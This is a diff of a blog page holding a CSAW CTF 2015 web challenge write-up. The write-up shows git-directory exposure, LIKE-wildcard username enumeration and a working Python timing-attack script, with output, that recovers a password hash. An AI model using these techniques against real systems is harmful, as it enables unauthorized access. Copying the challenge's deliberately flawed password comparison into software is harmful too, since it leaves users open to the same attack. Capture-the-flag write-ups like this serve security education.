@@ -46,7 +46,7 @@
       
       
     
-    <meta name="generator" content="Hugo 0.27-DEV" />
+    <meta name="generator" content="Hugo 0.40.3" />
 
     <link rel="canonical" href="https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/" />
 
@@ -163,95 +163,84 @@
 <img src="/blog/images/blog/csaw2015/lawn_care.png"></p>
 
 <p>We can immediately see there&rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&rsquo;s view the page source. Opening up the source, we see the following javascript snippet:</p>
-
-<pre><code class="language-javascript">function init(){
-            document.getElementById('login_form').onsubmit = function() {
-                var pass_field = document.getElementById('password'); 
-                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
-        };
-        $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
-        initGrass();
-}
-</code></pre>
-
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#2838b0;font-style:italic">function</span> init<span style="color:#888">(){</span>
+            <span style="color:#388038">document</span><span style="color:#888">.</span>getElementById<span style="color:#888">(</span><span style="color:#b83838">&#39;login_form&#39;</span><span style="color:#888">).</span>onsubmit <span style="color:#666">=</span> <span style="color:#2838b0;font-style:italic">function</span><span style="color:#888">()</span> <span style="color:#888">{</span>
+                <span style="color:#2838b0;font-style:italic">var</span> pass_field <span style="color:#666">=</span> <span style="color:#388038">document</span><span style="color:#888">.</span>getElementById<span style="color:#888">(</span><span style="color:#b83838">&#39;password&#39;</span><span style="color:#888">);</span> 
+                pass_field<span style="color:#888">.</span>value <span style="color:#666">=</span> CryptoJS<span style="color:#888">.</span>MD5<span style="color:#888">(</span>pass_field<span style="color:#888">.</span>value<span style="color:#888">).</span>toString<span style="color:#888">(</span>CryptoJS<span style="color:#888">.</span>enc<span style="color:#888">.</span>Hex<span style="color:#888">);</span>
+        <span style="color:#888">};</span>
+        $<span style="color:#888">.</span>ajax<span style="color:#888">(</span><span style="color:#b83838">&#39;.git/refs/heads/master&#39;</span><span style="color:#888">).</span>done<span style="color:#888">(</span><span style="color:#2838b0;font-style:italic">function</span><span style="color:#888">(</span>version<span style="color:#888">){</span>$<span style="color:#888">(</span><span style="color:#b83838">&#39;#version&#39;</span><span style="color:#888">).</span>html<span style="color:#888">(</span><span style="color:#b83838">&#39;Version: &#39;</span> <span style="color:#666">+</span>  version<span style="color:#888">.</span>substring <span style="color:#888">(</span><span style="color:#444">0</span><span style="color:#888">,</span><span style="color:#444">6</span><span style="color:#888">))});</span>
+        initGrass<span style="color:#888">();</span>
+<span style="color:#888">}</span>
+</code></pre></div>
 <p>You&rsquo;ll notice that there&rsquo;s an ajax call being made to a <code>.git</code> directory. If this is a full Git repo, we should be able to clone it:</p>
-
-<pre><code class="language-bash">jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
 jordan@temp:~$ ls web200
 ___HINT___  jobs.html  premium.php  validate_pass.php
-index.html  js         sign_up.php
-</code></pre>
-
+index.html  js         sign_up.php</code></pre></div>
 <p><em>Nice!</em> Now we can dive into the PHP. The <code>__HINT__</code> didn&rsquo;t prove to useful to me, but maybe I just didn&rsquo;t <em>get</em> it. Let&rsquo;s get started by looking at the relevant parts of <code>premium.php</code>.</p>
-
-<pre><code class="language-php">&lt;?php
-    require_once 'validate_pass.php';
-    require_once 'flag.php';
-    if (isset($_POST['password']) &amp;&amp; isset($_POST['username'])) {
-        $auth = validate($_POST['username'], $_POST['password']);
-        if ($auth){
-            echo &quot;&lt;h1&gt;&quot; . $flag . &quot;&lt;/h1&gt;&quot;;
-        }
-        else {
-            echo &quot;&lt;h1&gt;Not Authorized&lt;/h1&gt;&quot;;
-        }
-    }
-    else {
-        echo &quot;&lt;h1&gt;You must supply a username and password&lt;/h1&gt;&quot;;
-    }
-?&gt;
-</code></pre>
-
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#289870">&lt;?php</span>
+    <span style="color:#2838b0">require_once</span> <span style="color:#b83838">&#39;validate_pass.php&#39;</span><span style="color:#888">;</span>
+    <span style="color:#2838b0">require_once</span> <span style="color:#b83838">&#39;flag.php&#39;</span><span style="color:#888">;</span>
+    <span style="color:#2838b0">if</span> <span style="color:#888">(</span>isset<span style="color:#888">(</span><span style="color:#b04040">$_POST</span><span style="color:#888">[</span><span style="color:#b83838">&#39;password&#39;</span><span style="color:#888">])</span> <span style="color:#666">&amp;&amp;</span> isset<span style="color:#888">(</span><span style="color:#b04040">$_POST</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">]))</span> <span style="color:#888">{</span>
+        <span style="color:#b04040">$auth</span> <span style="color:#666">=</span> validate<span style="color:#888">(</span><span style="color:#b04040">$_POST</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">],</span> <span style="color:#b04040">$_POST</span><span style="color:#888">[</span><span style="color:#b83838">&#39;password&#39;</span><span style="color:#888">]);</span>
+        <span style="color:#2838b0">if</span> <span style="color:#888">(</span><span style="color:#b04040">$auth</span><span style="color:#888">){</span>
+            <span style="color:#2838b0">echo</span> <span style="color:#b83838">&#34;&lt;h1&gt;&#34;</span> <span style="color:#666">.</span> <span style="color:#b04040">$flag</span> <span style="color:#666">.</span> <span style="color:#b83838">&#34;&lt;/h1&gt;&#34;</span><span style="color:#888">;</span>
+        <span style="color:#888">}</span>
+        <span style="color:#2838b0">else</span> <span style="color:#888">{</span>
+            <span style="color:#2838b0">echo</span> <span style="color:#b83838">&#34;&lt;h1&gt;Not Authorized&lt;/h1&gt;&#34;</span><span style="color:#888">;</span>
+        <span style="color:#888">}</span>
+    <span style="color:#888">}</span>
+    <span style="color:#2838b0">else</span> <span style="color:#888">{</span>
+        <span style="color:#2838b0">echo</span> <span style="color:#b83838">&#34;&lt;h1&gt;You must supply a username and password&lt;/h1&gt;&#34;</span><span style="color:#888">;</span>
+    <span style="color:#888">}</span>
+<span style="color:#289870">?&gt;</span>
+</code></pre></div>
 <p>It looks like our flag is found in <code>flag.php</code>. Unfortunately, we don&rsquo;t have that file, but it looks like <code>$flag</code> is printed if we authenticate correctly.</p>
 
 <p>The authentication is handled by the <code>validate(username, password)</code> function in <code>validate_pass.php</code>. Let&rsquo;s see what it looks like:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#289870">&lt;?php</span>
+    <span style="color:#666">&lt;</span>snip<span style="color:#666">&gt;</span>
+    <span style="color:#b04040">$user</span> <span style="color:#666">=</span> mysql_real_escape_string<span style="color:#888">(</span><span style="color:#b04040">$user</span><span style="color:#888">);</span>
+    <span style="color:#b04040">$query</span> <span style="color:#666">=</span> <span style="color:#b83838">&#34;SELECT hash FROM users WHERE username=&#39;</span><span style="color:#b83838">$user</span><span style="color:#b83838">&#39;;&#34;</span><span style="color:#888">;</span>
+    <span style="color:#b04040">$result</span> <span style="color:#666">=</span> mysql_query<span style="color:#888">(</span><span style="color:#b04040">$query</span><span style="color:#888">)</span> <span style="color:#2838b0">or</span> <span style="color:#2838b0">die</span><span style="color:#888">(</span><span style="color:#b83838">&#39;Query failed: &#39;</span> <span style="color:#666">.</span> mysql_error<span style="color:#888">());</span>
+    <span style="color:#b04040">$line</span> <span style="color:#666">=</span> mysql_fetch_row<span style="color:#888">(</span><span style="color:#b04040">$result</span><span style="color:#888">,</span> MYSQL_ASSOC<span style="color:#888">);</span>
+    <span style="color:#b04040">$hash</span> <span style="color:#666">=</span> <span style="color:#b04040">$line</span><span style="color:#888">[</span><span style="color:#b83838">&#39;hash&#39;</span><span style="color:#888">];</span>
 
-<pre><code class="language-php">&lt;?php
-    &lt;snip&gt;
-    $user = mysql_real_escape_string($user);
-    $query = &quot;SELECT hash FROM users WHERE username='$user';&quot;;
-    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
-    $line = mysql_fetch_row($result, MYSQL_ASSOC);
-    $hash = $line['hash'];
+    <span style="color:#2838b0">if</span> <span style="color:#888">(</span>strlen<span style="color:#888">(</span><span style="color:#b04040">$pass</span><span style="color:#888">)</span> <span style="color:#666">!=</span> strlen<span style="color:#888">(</span><span style="color:#b04040">$hash</span><span style="color:#888">))</span>
+        <span style="color:#2838b0">return</span> <span style="color:#2838b0">False</span><span style="color:#888">;</span>
 
-    if (strlen($pass) != strlen($hash))
-        return False;
-
-    $index = 0;
-    while($hash[$index]){
-        if ($pass[$index] != $hash[$index])
-            return false;
-        # Protect against brute force attacks
-        usleep(300000);
-        $index+=1;
-    }
-    return true;
-    &lt;snip&gt;
-?&gt;
-</code></pre>
-
+    <span style="color:#b04040">$index</span> <span style="color:#666">=</span> <span style="color:#444">0</span><span style="color:#888">;</span>
+    <span style="color:#2838b0">while</span><span style="color:#888">(</span><span style="color:#b04040">$hash</span><span style="color:#888">[</span><span style="color:#b04040">$index</span><span style="color:#888">]){</span>
+        <span style="color:#2838b0">if</span> <span style="color:#888">(</span><span style="color:#b04040">$pass</span><span style="color:#888">[</span><span style="color:#b04040">$index</span><span style="color:#888">]</span> <span style="color:#666">!=</span> <span style="color:#b04040">$hash</span><span style="color:#888">[</span><span style="color:#b04040">$index</span><span style="color:#888">])</span>
+            <span style="color:#2838b0">return</span> <span style="color:#2838b0">false</span><span style="color:#888">;</span>
+        <span style="color:#888;font-style:italic"># Protect against brute force attacks
+</span><span style="color:#888;font-style:italic"></span>        usleep<span style="color:#888">(</span><span style="color:#444">300000</span><span style="color:#888">);</span>
+        <span style="color:#b04040">$index</span><span style="color:#666">+=</span><span style="color:#444">1</span><span style="color:#888">;</span>
+    <span style="color:#888">}</span>
+    <span style="color:#2838b0">return</span> <span style="color:#2838b0">true</span><span style="color:#888">;</span>
+    <span style="color:#666">&lt;</span>snip<span style="color:#666">&gt;</span>
+<span style="color:#289870">?&gt;</span>
+</code></pre></div>
 <p>This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.</p>
 
 <p>We&rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, <code>sign_up.php</code> that might help. Let&rsquo;s take a look:</p>
-
-<pre><code class="language-php">&lt;?php
-    &lt;snip&gt;
-    $user = mysql_real_escape_string($_POST['username']);
-    // check to see if the username is available
-    $query = &quot;SELECT username FROM users WHERE username LIKE '$user';&quot;;
-    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
-    $line = mysql_fetch_row($result, MYSQL_ASSOC);
-    if ($line == NULL){
-        // Signing up for premium is still in development
-        echo '&lt;h2 style=&quot;margin: 60px;&quot;&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;';
-    }
-    else {
-        echo '&lt;h2 style=&quot;margin: 60px;&quot;&gt;Username: ' . $line['username'] . &quot; is not available&lt;/h2&gt;&quot;;
-    }
-    &lt;snip&gt;
-?&gt;
-</code></pre>
-
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#289870">&lt;?php</span>
+    <span style="color:#666">&lt;</span>snip<span style="color:#666">&gt;</span>
+    <span style="color:#b04040">$user</span> <span style="color:#666">=</span> mysql_real_escape_string<span style="color:#888">(</span><span style="color:#b04040">$_POST</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">]);</span>
+    <span style="color:#888;font-style:italic">// check to see if the username is available
+</span><span style="color:#888;font-style:italic"></span>    <span style="color:#b04040">$query</span> <span style="color:#666">=</span> <span style="color:#b83838">&#34;SELECT username FROM users WHERE username LIKE &#39;</span><span style="color:#b83838">$user</span><span style="color:#b83838">&#39;;&#34;</span><span style="color:#888">;</span>
+    <span style="color:#b04040">$result</span> <span style="color:#666">=</span> mysql_query<span style="color:#888">(</span><span style="color:#b04040">$query</span><span style="color:#888">)</span> <span style="color:#2838b0">or</span> <span style="color:#2838b0">die</span><span style="color:#888">(</span><span style="color:#b83838">&#39;Query failed: &#39;</span> <span style="color:#666">.</span> mysql_error<span style="color:#888">());</span>
+    <span style="color:#b04040">$line</span> <span style="color:#666">=</span> mysql_fetch_row<span style="color:#888">(</span><span style="color:#b04040">$result</span><span style="color:#888">,</span> MYSQL_ASSOC<span style="color:#888">);</span>
+    <span style="color:#2838b0">if</span> <span style="color:#888">(</span><span style="color:#b04040">$line</span> <span style="color:#666">==</span> <span style="color:#2838b0">NULL</span><span style="color:#888">){</span>
+        <span style="color:#888;font-style:italic">// Signing up for premium is still in development
+</span><span style="color:#888;font-style:italic"></span>        <span style="color:#2838b0">echo</span> <span style="color:#b83838">&#39;&lt;h2 style=&#34;margin: 60px;&#34;&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;&#39;</span><span style="color:#888">;</span>
+    <span style="color:#888">}</span>
+    <span style="color:#2838b0">else</span> <span style="color:#888">{</span>
+        <span style="color:#2838b0">echo</span> <span style="color:#b83838">&#39;&lt;h2 style=&#34;margin: 60px;&#34;&gt;Username: &#39;</span> <span style="color:#666">.</span> <span style="color:#b04040">$line</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">]</span> <span style="color:#666">.</span> <span style="color:#b83838">&#34; is not available&lt;/h2&gt;&#34;</span><span style="color:#888">;</span>
+    <span style="color:#888">}</span>
+    <span style="color:#666">&lt;</span>snip<span style="color:#666">&gt;</span>
+<span style="color:#289870">?&gt;</span>
+</code></pre></div>
 <p>This function tries to look up the username given and, if it exists, will tell us the username isn&rsquo;t available. We could try guessing (I did), but that doesn&rsquo;t help. Let&rsquo;s look more closely at the code.</p>
 
 <p>The SQL statement is done via a <code>LIKE</code> condition. This allows us to use the <code>%</code> character as a wildcard. So, by trying the username <code>%</code>, we should get the username from the database.</p>
@@ -261,60 +250,53 @@ index.html  js         sign_up.php
 <p>Awesome - our username is <code>~~FLAG~~</code>. Now we need to find the password.</p>
 
 <p>Going back to the code given in <code>validate_pass.php</code>, we see the following comparison</p>
-
-<pre><code class="language-php">    while($hash[$index]){
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    while($hash[$index]){
         if ($pass[$index] != $hash[$index])
             return false;
         # Protect against brute force attacks
         usleep(300000);
         $index+=1;
-    }
-</code></pre>
-
+    }</code></pre></div>
 <p>This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a <code>usleep(300000)</code>, which is .3 seconds. This means that, if we check every character, one will take longer. This is a <strong>timing attack</strong>.</p>
 
 <p>I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:</p>
-
-<pre><code class="language-text">import time
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">import time
 import requests
 
 data = {
-	&quot;username&quot; : &quot;~~FLAG~~&quot;,
-	&quot;password&quot; : &quot;&quot;
+	&#34;username&#34; : &#34;~~FLAG~~&#34;,
+	&#34;password&#34; : &#34;&#34;
 }
 
-url = &quot;http://54.175.3.248:8089/premium.php&quot;
+url = &#34;http://54.175.3.248:8089/premium.php&#34;
 
-password = ['a']*32 
+password = [&#39;a&#39;]*32 
 
 def send_request(password):
-	data[&quot;password&quot;] = password
+	data[&#34;password&#34;] = password
 	start = time.time()
 	requests.post(url, data=data)
 	end = time.time()
 	return end - start	
 
-hex = &quot;0123456789abcdef&quot;
+hex = &#34;0123456789abcdef&#34;
 
 for i in range(32):
 	max_time = 0
-	char = &quot;&quot;
+	char = &#34;&#34;
 	index = 0
 	for j in hex:
 		temp_pass = password
 		temp_pass[i] = j
-		request_time = send_request(&quot;&quot;.join(temp_pass))
+		request_time = send_request(&#34;&#34;.join(temp_pass))
 		if request_time &gt;= max_time:
 			index = i
 			max_time = request_time
 			char = j
 	password[index] = char	
-	print &quot;&quot;.join(password)
-</code></pre>
-
+	print &#34;&#34;.join(password)</code></pre></div>
 <p>This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:</p>
-
-<pre><code class="language-text">6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
@@ -345,23 +327,18 @@ for i in range(32):
 667e217666a13d39a0239951efe2daaa
 667e217666a13d39a0239951efe2deaa
 667e217666a13d39a0239951efe2de4a
-667e217666a13d39a0239951efe2de48
-</code></pre>
-
+667e217666a13d39a0239951efe2de48</code></pre></div>
 <p>Now, all that&rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):</p>
-
-<pre><code class="language-text">$.post('premium.php', {&quot;username&quot;: &quot;~~FLAG~~&quot;, &quot;password&quot; : &quot;667e217666a13d39a0239951efe2de48&quot;}).success(function(data){console.log(data)})
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$.post(&#39;premium.php&#39;, {&#34;username&#34;: &#34;~~FLAG~~&#34;, &#34;password&#34; : &#34;667e217666a13d39a0239951efe2de48&#34;}).success(function(data){console.log(data)})
 &lt;head&gt;
     &lt;title&gt;Lawn Care Simulator 2015&lt;/title&gt;
-    &lt;script src=&quot;//code.jquery.com/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt;
-    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 
-    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&quot;&gt;
+    &lt;script src=&#34;//code.jquery.com/jquery-1.11.3.min.js&#34;&gt;&lt;/script&gt;
+    &lt;script src=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&#34;&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;h1&gt;flag{gr0wth__h4ck!nG!1!1!&lt;/h1&gt;&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
+&lt;/html&gt;</code></pre></div>
 <p>And there we have the flag: <code>flag{gr0wth__h4ck!nG!1!1!}</code></p>
 
 <p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
@@ -373,7 +350,7 @@ for i in range(32):
 
     
     <figure class="author-image">
-        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-wright-2-crop.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
+        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-profile.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
     </figure>
     
 
@@ -386,7 +363,7 @@ for i in range(32):
 <section class="author">
   <h4><a href="https://jordan-wright.com/blog/">Jordan Wright</a></h4>
   
-  <p>Security Researcher, Programmer, Time&#39;s 2006 Person of the Year</p>
+  <p>Security Researcher, Programmer.</p>
   
   <div class="author-meta">
     <span class="author-location icon-location">San Antonio, Texas</span>
